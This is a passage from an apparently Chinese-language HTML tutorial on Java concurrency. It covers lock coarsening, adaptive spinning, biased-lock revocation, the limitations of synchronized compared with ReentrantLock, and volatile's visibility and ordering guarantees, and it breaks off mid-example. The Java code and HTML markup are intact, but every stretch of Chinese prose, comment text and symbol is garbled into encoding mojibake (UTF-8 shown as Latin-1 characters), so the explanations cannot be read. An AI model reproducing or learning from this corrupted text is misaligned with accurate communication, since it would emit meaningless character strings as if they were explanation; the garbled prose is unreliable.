<p><strong>åŸç†ï¼š</strong> å°†å¤šä¸ªè¿ç»­çš„åŠ é”ã€è§£é”æ“ä½œåˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„é”ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ç²—åŒ–ï¼Ÿ</strong></p>
<ul>
<li>é¢‘ç¹åŠ é”è§£é”æœ‰å¼€é”€</li>
<li>å¦‚æœè¿ç»­çš„åŒæ­¥å—ä½¿ç”¨åŒä¸€ä¸ªé”ï¼Œå¯ä»¥åˆå¹¶</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ åŸå§‹ä»£ç ï¼šå¤šä¸ªè¿ç»­çš„åŒæ­¥å—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count1++;  <span class="hljs-comment">// æ“ä½œ1</span>
    }
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count2++;  <span class="hljs-comment">// æ“ä½œ2</span>
    }
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count3++;  <span class="hljs-comment">// æ“ä½œ3</span>
    }
}

<span class="hljs-comment">// âœ… JVMä¼˜åŒ–åï¼šåˆå¹¶ä¸ºä¸€ä¸ªåŒæ­¥å—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count1++;  <span class="hljs-comment">// æ“ä½œ1</span>
        count2++;  <span class="hljs-comment">// æ“ä½œ2</span>
        count3++;  <span class="hljs-comment">// æ“ä½œ3</span>
    }
}
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… å¾ªç¯ä¸­çš„åŒæ­¥æ“ä½œ</li>
<li>âœ… è¿ç»­çš„åŒæ­¥å—ï¼ˆä½¿ç”¨åŒä¸€ä¸ªé”ï¼‰</li>
<li>âœ… é”çš„ç²’åº¦å¯ä»¥é€‚å½“å¢å¤§è€Œä¸å½±å“æ€§èƒ½</li>
</ul>
<p><strong>æ•ˆæœï¼š</strong> å‡å°‘åŠ é”è§£é”çš„æ¬¡æ•°ï¼Œæé«˜æ€§èƒ½</p>
<h4 data-id="heading-75">è‡ªé€‚åº”è‡ªæ—‹ï¼ˆAdaptive Spinningï¼‰</h4>
<p><strong>åŸç†ï¼š</strong> è‡ªæ—‹æ¬¡æ•°ä¸å†å›ºå®šï¼Œè€Œæ˜¯æ ¹æ®å†å²æƒ…å†µåŠ¨æ€è°ƒæ•´ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦è‡ªé€‚åº”ï¼Ÿ</strong></p>
<ul>
<li>å›ºå®šè‡ªæ—‹æ¬¡æ•°å¯èƒ½æµªè´¹CPUï¼ˆå¤ªå¤šæ¬¡ï¼‰</li>
<li>ä¹Ÿå¯èƒ½é”™è¿‡æœºä¼šï¼ˆå¤ªå°‘äº†ï¼‰</li>
</ul>
<p><strong>è‡ªé€‚åº”ç­–ç•¥ï¼š</strong></p>
<pre><code class="hljs">å¦‚æœä¹‹å‰è‡ªæ—‹æˆåŠŸè¿‡ï¼š
  â†’ å¢åŠ è‡ªæ—‹æ¬¡æ•°ï¼ˆå¯èƒ½å¾ˆå¿«å°±èƒ½è·å¾—é”ï¼‰

å¦‚æœä¹‹å‰è‡ªæ—‹å¾ˆå°‘æˆåŠŸï¼š
  â†’ å‡å°‘è‡ªæ—‹æ¬¡æ•°ï¼ˆå‡å°‘CPUæµªè´¹ï¼‰
  â†’ ç”šè‡³ç›´æ¥é˜»å¡ï¼ˆä¸æµªè´¹æ—¶é—´è‡ªæ—‹ï¼‰
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>JVMä¼š"å­¦ä¹ "è¿™ä¸ªé”çš„ç‰¹æ€§</li>
<li>æ ¹æ®å†å²æˆåŠŸç‡è°ƒæ•´ç­–ç•¥</li>
<li>æ™ºèƒ½ä¼˜åŒ–ï¼Œæé«˜æ•ˆç‡</li>
</ul>
<p><strong>æ•ˆæœï¼š</strong> å¹³è¡¡CPUæ¶ˆè€—å’Œæ€§èƒ½ï¼Œæ™ºèƒ½ä¼˜åŒ–</p>
<h4 data-id="heading-76">åå‘é”çš„æ’¤é”€</h4>
<p><strong>ä»€ä¹ˆæ—¶å€™æ’¤é”€åå‘é”ï¼Ÿ</strong></p>
<p><strong>æ’¤é”€åœºæ™¯ï¼š</strong></p>
<ol>
<li><strong>æœ‰å…¶ä»–çº¿ç¨‹ç«äº‰</strong>ï¼šå‘ç°çº¿ç¨‹IDä¸æ˜¯å½“å‰çº¿ç¨‹</li>
<li><strong>è°ƒç”¨hashCode()</strong>ï¼šåå‘é”çš„Mark Wordæ²¡æœ‰ç©ºé—´å­˜å‚¨hashCode</li>
<li><strong>è°ƒç”¨wait()/notify()</strong>ï¼šè¿™äº›æ–¹æ³•éœ€è¦é‡é‡çº§é”ï¼ˆmonitorï¼‰</li>
</ol>
<p><strong>æ’¤é”€è¿‡ç¨‹ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æš‚åœæ‹¥æœ‰åå‘é”çš„çº¿ç¨‹ï¼ˆå®‰å…¨ç‚¹ï¼‰
<span class="hljs-bullet">2.</span> æ£€æŸ¥çº¿ç¨‹çŠ¶æ€ï¼š
   â”œâ”€ è¿˜åœ¨æ‰§è¡ŒåŒæ­¥ä»£ç å— â†’ å‡çº§ä¸ºè½»é‡çº§é”
   â””â”€ å·²ç»ç¦»å¼€åŒæ­¥ä»£ç å— â†’ æ¢å¤åˆ°æ— é”çŠ¶æ€
<span class="hljs-bullet">3.</span> å”¤é†’æš‚åœçš„çº¿ç¨‹
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®‰å…¨ç‚¹ï¼Ÿ</strong></p>
<ul>
<li>æ’¤é”€æ—¶éœ€è¦ä¿®æ”¹Mark Word</li>
<li>å¿…é¡»åœ¨çº¿ç¨‹å®‰å…¨ç‚¹è¿›è¡Œï¼ˆçº¿ç¨‹æš‚åœçŠ¶æ€ï¼‰</li>
<li>ç¡®ä¿æ“ä½œçš„åŸå­æ€§</li>
</ul>
<h3 data-id="heading-77">3.4 synchronizedçš„å±€é™æ€§</h3>
<p><strong>è™½ç„¶synchronizedå¾ˆå¼ºå¤§ï¼Œä½†ä¹Ÿæœ‰ä¸€äº›é™åˆ¶ã€‚</strong></p>
<h4 data-id="heading-78">ä¸å¯ä¸­æ–­</h4>
<p><strong>é—®é¢˜ï¼š</strong> çº¿ç¨‹åœ¨ç­‰å¾…synchronizedé”æ—¶ï¼Œæ— æ³•å“åº”ä¸­æ–­</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

<span class="hljs-comment">// çº¿ç¨‹1ï¼šæŒæœ‰é”ï¼Œæ‰§è¡Œå¾ˆé•¿æ—¶é—´</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">10000</span>);  <span class="hljs-comment">// æŒæœ‰é”10ç§’</span>
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            <span class="hljs-comment">// å³ä½¿è¢«ä¸­æ–­ï¼Œä¹Ÿä¼šç»§ç»­æŒæœ‰é”</span>
        }
    }
}

<span class="hljs-comment">// çº¿ç¨‹2ï¼šç­‰å¾…è·å–é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// âš ï¸ é—®é¢˜ï¼šæ— æ³•ä¸­æ–­è¿™ä¸ªç­‰å¾…</span>
    <span class="hljs-comment">// å³ä½¿è°ƒç”¨thread.interrupt()ï¼Œçº¿ç¨‹2ä¹Ÿä¸ä¼šå“åº”</span>
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-comment">// å¿…é¡»ç­‰å¾…method1é‡Šæ”¾é”</span>
    }
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>çº¿ç¨‹2åœ¨ç­‰å¾…é”æ—¶ï¼Œå¦‚æœè°ƒç”¨<code>thread2.interrupt()</code>ï¼Œçº¿ç¨‹2ä¸ä¼šå“åº”</li>
<li>å¿…é¡»ç­‰åˆ°çº¿ç¨‹1é‡Šæ”¾é”ï¼Œçº¿ç¨‹2æ‰èƒ½ç»§ç»­</li>
<li>å¯èƒ½å¯¼è‡´çº¿ç¨‹ä¸€ç›´ç­‰å¾…</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong> ä½¿ç”¨<code>ReentrantLock.lockInterruptibly()</code>ï¼Œå¯ä»¥å“åº”ä¸­æ–­</p>
<h4 data-id="heading-79">éå…¬å¹³é”</h4>
<p><strong>é—®é¢˜ï¼š</strong> synchronizedæ˜¯éå…¬å¹³çš„ï¼Œå¯èƒ½å¯¼è‡´çº¿ç¨‹é¥¥é¥¿</p>
<p><strong>ä»€ä¹ˆæ˜¯éå…¬å¹³ï¼Ÿ</strong></p>
<ul>
<li>æ–°æ¥çš„çº¿ç¨‹å¯èƒ½"æ’é˜Ÿ"</li>
<li>æ¯”ç­‰å¾…é˜Ÿåˆ—ä¸­çš„çº¿ç¨‹å…ˆè·å¾—é”</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

<span class="hljs-comment">// çº¿ç¨‹Aï¼šç­‰å¾…é”ï¼ˆåœ¨é˜Ÿåˆ—ä¸­ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodA</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-comment">// çº¿ç¨‹Aåœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…äº†å¾ˆä¹…</span>
    }
}

<span class="hljs-comment">// çº¿ç¨‹Bï¼šæ–°æ¥çš„çº¿ç¨‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodB</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// âš ï¸ çº¿ç¨‹Bå¯èƒ½æ¯”çº¿ç¨‹Aå…ˆè·å¾—é”ï¼ˆéå…¬å¹³ï¼‰</span>
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-comment">// æ–°çº¿ç¨‹å¯èƒ½æ’é˜ŸæˆåŠŸ</span>
    }
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>ç­‰å¾…æ—¶é—´é•¿çš„çº¿ç¨‹å¯èƒ½ä¸€ç›´è·å–ä¸åˆ°é”</li>
<li>æ–°æ¥çš„çº¿ç¨‹å¯èƒ½ä¸æ–­æ’é˜Ÿ</li>
<li>å¯¼è‡´æŸäº›çº¿ç¨‹"é¥¥é¥¿"ï¼ˆä¸€ç›´ç­‰å¾…ï¼‰</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong> ä½¿ç”¨<code>ReentrantLock(true)</code>åˆ›å»ºå…¬å¹³é”</p>
<h4 data-id="heading-80">æ€§èƒ½é—®é¢˜</h4>
<p><strong>å†å²æ¼”è¿›ï¼š</strong></p>
<p><strong>JDK 1.6ä¹‹å‰ï¼š</strong></p>
<ul>
<li>synchronizedæ˜¯é‡é‡çº§é”</li>
<li>æ¯æ¬¡åŠ é”éƒ½éœ€è¦æ“ä½œç³»ç»Ÿå‚ä¸</li>
<li>æ€§èƒ½è¾ƒå·®</li>
</ul>
<p><strong>JDK 1.6ä¹‹åï¼š</strong></p>
<ul>
<li>âœ… å¼•å…¥äº†é”å‡çº§æœºåˆ¶ï¼ˆåå‘é” â†’ è½»é‡çº§é” â†’ é‡é‡çº§é”ï¼‰</li>
<li>âœ… æ€§èƒ½å¤§å¹…æå‡</li>
<li>âœ… åœ¨ä½ç«äº‰æƒ…å†µä¸‹ï¼Œæ€§èƒ½æ¥è¿‘æ— é”</li>
</ul>
<p><strong>æ€§èƒ½å¯¹æ¯”ï¼š</strong></p>






























<table><thead><tr><th>åœºæ™¯</th><th>synchronized</th><th>ReentrantLock</th></tr></thead><tbody><tr><td><strong>ä½ç«äº‰</strong></td><td>âœ… æ€§èƒ½å¾ˆå¥½ï¼ˆé”å‡çº§ä¼˜åŒ–ï¼‰</td><td>âœ… æ€§èƒ½ä¹Ÿå¾ˆå¥½</td></tr><tr><td><strong>é«˜ç«äº‰</strong></td><td>âš ï¸ å¯èƒ½å‡çº§ä¸ºé‡é‡çº§é”</td><td>âœ… æ€§èƒ½å¯èƒ½æ›´å¥½</td></tr><tr><td><strong>å¯ä¸­æ–­</strong></td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒ</td></tr><tr><td><strong>å…¬å¹³é”</strong></td><td>âŒ éå…¬å¹³</td><td>âœ… å¯é€‰å…¬å¹³/éå…¬å¹³</td></tr></tbody></table>
<p><strong>å»ºè®®ï¼š</strong></p>
<ul>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œsynchronizedæ€§èƒ½å·²ç»å¾ˆå¥½</li>
<li>éœ€è¦å¯ä¸­æ–­æˆ–å…¬å¹³é”æ—¶ï¼Œä½¿ç”¨ReentrantLock</li>
<li>ä½ç«äº‰åœºæ™¯ï¼šä¸¤è€…æ€§èƒ½æ¥è¿‘</li>
</ul>
<hr/>
<h2 data-id="heading-81">ç¬¬å››ç«  volatileå…³é”®å­—</h2>
<h3 data-id="heading-82">4.1 volatileçš„ä½œç”¨</h3>
<p><strong>volatileæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li>volatileæ˜¯ä¸€ä¸ªå…³é”®å­—ï¼Œç”¨äºä¿®é¥°å˜é‡</li>
<li>ä¿è¯å˜é‡çš„å¯è§æ€§å’Œæœ‰åºæ€§</li>
<li>ä½†ä¸ä¿è¯åŸå­æ€§</li>
</ul>
<h4 data-id="heading-83">ä¿è¯å¯è§æ€§</h4>
<p><strong>ä»€ä¹ˆæ˜¯å¯è§æ€§é—®é¢˜ï¼Ÿ</strong></p>
<p>åœ¨å¤šæ ¸CPUç¯å¢ƒä¸‹ï¼Œæ¯ä¸ªCPUéƒ½æœ‰è‡ªå·±çš„ç¼“å­˜ã€‚çº¿ç¨‹å¯èƒ½åœ¨è‡ªå·±çš„CPUç¼“å­˜ä¸­ä¿å­˜å˜é‡çš„å‰¯æœ¬ï¼Œå¯¼è‡´ä¸€ä¸ªçº¿ç¨‹çš„ä¿®æ”¹ï¼Œå…¶ä»–çº¿ç¨‹çœ‹ä¸åˆ°ã€‚</p>
<p><strong>å¯è§æ€§é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é—®é¢˜ä»£ç ï¼šæ²¡æœ‰volatile</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        <span class="hljs-keyword">while</span> (!flag) {
            <span class="hljs-comment">// âš ï¸ å¯èƒ½æ°¸è¿œå¾ªç¯</span>
            <span class="hljs-comment">// çº¿ç¨‹åœ¨è‡ªå·±çš„CPUç¼“å­˜ä¸­è¯»å–flag=false</span>
            <span class="hljs-comment">// çœ‹ä¸åˆ°ä¸»çº¿ç¨‹ä¿®æ”¹flag=true</span>
        }
        System.out.println(<span class="hljs-string">"çº¿ç¨‹ç»“æŸ"</span>);
    }).start();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
    flag = <span class="hljs-literal">true</span>;  
    <span class="hljs-comment">// âš ï¸ ä¿®æ”¹å¯èƒ½åªæ›´æ–°åœ¨CPUç¼“å­˜ä¸­</span>
    <span class="hljs-comment">// æ²¡æœ‰åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼Œå…¶ä»–çº¿ç¨‹çœ‹ä¸åˆ°</span>
}
</code></pre>
<p><strong>é—®é¢˜åŸå› ï¼š</strong></p>
<ul>
<li>CPUç¼“å­˜ï¼šæ¯ä¸ªCPUæœ‰è‡ªå·±çš„ç¼“å­˜ï¼Œå˜é‡å¯èƒ½åªå­˜åœ¨ç¼“å­˜ä¸­</li>
<li>ç¼“å­˜æœªåŒæ­¥ï¼šä¿®æ”¹æ²¡æœ‰åˆ·æ–°åˆ°ä¸»å†…å­˜</li>
<li>å…¶ä»–çº¿ç¨‹çœ‹ä¸åˆ°ï¼šä»è‡ªå·±çš„ç¼“å­˜è¯»å–ï¼Œè¿˜æ˜¯æ—§å€¼</li>
</ul>
<p><strong>ä½¿ç”¨volatileè§£å†³ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨volatile</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        <span class="hljs-keyword">while</span> (!flag) {
            <span class="hljs-comment">// âœ… èƒ½åŠæ—¶çœ‹åˆ°flagçš„å˜åŒ–</span>
            <span class="hljs-comment">// volatileä¿è¯ä»ä¸»å†…å­˜è¯»å–æœ€æ–°å€¼</span>
        }
        System.out.println(<span class="hljs-string">"çº¿ç¨‹ç»“æŸ"</span>);
    }).start();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
    flag = <span class="hljs-literal">true</span>;  
    <span class="hljs-comment">// âœ… ä¿®æ”¹ç«‹å³åˆ·æ–°åˆ°ä¸»å†…å­˜</span>
    <span class="hljs-comment">// å…¶ä»–çº¿ç¨‹èƒ½ç«‹å³çœ‹åˆ°</span>
}
</code></pre>
<p><strong>volatileçš„å¯è§æ€§ä¿è¯ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">å†™volatileå˜é‡ï¼š
<span class="hljs-bullet">1.</span> çº¿ç¨‹ä¿®æ”¹volatileå˜é‡
<span class="hljs-bullet">2.</span> ç«‹å³åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼ˆä¸æ˜¯åªå†™ç¼“å­˜ï¼‰
<span class="hljs-bullet">3.</span> ä½¿å…¶ä»–CPUçš„ç¼“å­˜å¤±æ•ˆ

è¯»volatileå˜é‡ï¼š
<span class="hljs-bullet">1.</span> çº¿ç¨‹è¯»å–volatileå˜é‡
<span class="hljs-bullet">2.</span> ä»ä¸»å†…å­˜è¯»å–ï¼ˆä¸ä»ç¼“å­˜è¯»ï¼‰
<span class="hljs-bullet">3.</span> ä¿è¯è¯»åˆ°æœ€æ–°å€¼
</code></pre>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>æ²¡æœ‰volatileï¼šå°±åƒæ¯ä¸ªäººæœ‰è‡ªå·±çš„ç¬”è®°æœ¬ï¼Œä¿®æ”¹äº†ä½†åˆ«äººçœ‹ä¸åˆ°</li>
<li>æœ‰volatileï¼šå°±åƒå†™åœ¨å…¬å‘Šæ¿ä¸Šï¼Œæ‰€æœ‰äººéƒ½èƒ½çœ‹åˆ°æœ€æ–°å†…å®¹</li>
</ul>
<h4 data-id="heading-84">ç¦æ­¢æŒ‡ä»¤é‡æ’åº</h4>
<p><strong>ä»€ä¹ˆæ˜¯æŒ‡ä»¤é‡æ’åºï¼Ÿ</strong></p>
<p>ä¸ºäº†ä¼˜åŒ–æ€§èƒ½ï¼Œç¼–è¯‘å™¨å’ŒCPUå¯èƒ½ä¼šé‡æ–°æ’åˆ—æŒ‡ä»¤çš„æ‰§è¡Œé¡ºåºã€‚åœ¨å•çº¿ç¨‹ä¸‹æ²¡é—®é¢˜ï¼Œä½†åœ¨å¤šçº¿ç¨‹ä¸‹å¯èƒ½å¯¼è‡´é—®é¢˜ã€‚</p>
<p><strong>é‡æ’åºé—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é—®é¢˜ä»£ç ï¼šå¯èƒ½é‡æ’åº</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æ²¡æœ‰volatile</span>

<span class="hljs-comment">// çº¿ç¨‹1</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
    a = <span class="hljs-number">1</span>;      <span class="hljs-comment">// æŒ‡ä»¤1</span>
    b = <span class="hljs-number">2</span>;      <span class="hljs-comment">// æŒ‡ä»¤2</span>
    flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// æŒ‡ä»¤3</span>
    <span class="hljs-comment">// âš ï¸ å¯èƒ½è¢«é‡æ’åºä¸ºï¼š3 -&gt; 1 -&gt; 2</span>
    <span class="hljs-comment">// CPUæˆ–ç¼–è¯‘å™¨å¯èƒ½ä¼˜åŒ–æ‰§è¡Œé¡ºåº</span>
}

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (flag) {
        <span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> a; <span class="hljs-comment">// âš ï¸ å¯èƒ½çœ‹åˆ°a=0ï¼ˆè¿˜æ²¡æ‰§è¡Œa=1ï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> b; <span class="hljs-comment">// å¯èƒ½çœ‹åˆ°b=2</span>
        <span class="hljs-comment">// å› ä¸ºæŒ‡ä»¤é‡æ’åºï¼Œçœ‹åˆ°ä¸ä¸€è‡´çš„çŠ¶æ€</span>
    }
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>æŒ‡ä»¤1å’Œ2å¯èƒ½åœ¨æŒ‡ä»¤3ä¹‹åæ‰§è¡Œï¼ˆé‡æ’åºï¼‰</li>
<li>çº¿ç¨‹2çœ‹åˆ°flag=trueæ—¶ï¼Œaå¯èƒ½è¿˜æ˜¯0</li>
<li>å¯¼è‡´æ•°æ®ä¸ä¸€è‡´</li>
</ul>
<p><strong>ä½¿ç”¨volatileè§£å†³ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨volatileç¦æ­¢é‡æ’åº</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// volatileç¦æ­¢é‡æ’åº</span>

<span class="hljs-comment">// çº¿ç¨‹1</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
    a = <span class="hljs-number">1</span>;      <span class="hljs-comment">// 1</span>
    b = <span class="hljs-number">2</span>;      <span class="hljs-comment">// 2</span>
    flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 3</span>
    <span class="hljs-comment">// âœ… volatileå†™ï¼šå‰é¢çš„æ“ä½œä¸èƒ½é‡æ’åºåˆ°åé¢</span>
    <span class="hljs-comment">// ä¿è¯a=1å’Œb=2åœ¨flag=trueä¹‹å‰å®Œæˆ</span>
}

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (flag) {  
        <span class="hljs-comment">// âœ… volatileè¯»ï¼šåé¢çš„æ“ä½œä¸èƒ½é‡æ’åºåˆ°å‰é¢</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> a; <span class="hljs-comment">// ä¿è¯çœ‹åˆ°a=1ï¼ˆå› ä¸ºvolatileä¿è¯æœ‰åºæ€§ï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> b; <span class="hljs-comment">// ä¿è¯çœ‹åˆ°b=2</span>
    }
}
</code></pre>
<p><strong>volatileçš„å†…å­˜å±éšœï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<p>volatileé€šè¿‡æ’å…¥å†…å­˜å±éšœæ¥ç¦æ­¢é‡æ’åºï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">å†™<span class="hljs-keyword">volatile</span>å˜é‡ï¼š
æ™®é€šå†™<span class="hljs-number">1</span>
æ™®é€šå†™<span class="hljs-number">2</span>
â”€â”€â”€â”€â”€â”€â”€ StoreStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢ä¸Šé¢çš„æ™®é€šå†™å’Œ<span class="hljs-keyword">volatile</span>å†™é‡æ’åº
<span class="hljs-keyword">volatile</span>å†™
â”€â”€â”€â”€â”€â”€â”€ StoreLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>å†™å’Œä¸‹é¢çš„æ“ä½œé‡æ’åº

è¯»<span class="hljs-keyword">volatile</span>å˜é‡ï¼š
<span class="hljs-keyword">volatile</span>è¯»
â”€â”€â”€â”€â”€â”€â”€ LoadLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œä¸‹é¢çš„è¯»é‡æ’åº
â”€â”€â”€â”€â”€â”€â”€ LoadStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€ â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œä¸‹é¢çš„å†™é‡æ’åº
æ™®é€šè¯»
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å†…å­˜å±éšœå°±åƒ"æ æ†"ï¼Œé˜»æ­¢æŒ‡ä»¤è·¨è¶Š</li>
<li>volatileå†™å‰çš„æ“ä½œä¸èƒ½ç§»åˆ°å†™ä¹‹å</li>
<li>volatileè¯»åçš„æ“ä½œä¸èƒ½ç§»åˆ°è¯»ä¹‹å‰</li>
<li>ä¿è¯æœ‰åºæ€§</li>
</ul>
<h4 data-id="heading-85">ä¸ä¿è¯åŸå­æ€§</h4>
<p><strong>ä»€ä¹ˆæ˜¯åŸå­æ€§ï¼Ÿ</strong></p>
<ul>
<li>åŸå­æ€§ï¼šæ“ä½œè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½ä¸æ‰§è¡Œï¼Œä¸ä¼šè¢«æ‰“æ–­</li>
<li>volatileåªä¿è¯å¯è§æ€§å’Œæœ‰åºæ€§ï¼Œ<strong>ä¸ä¿è¯åŸå­æ€§</strong></li>
</ul>
<p><strong>åŸå­æ€§é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼švolatileä¸èƒ½ä¿è¯åŸå­æ€§</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

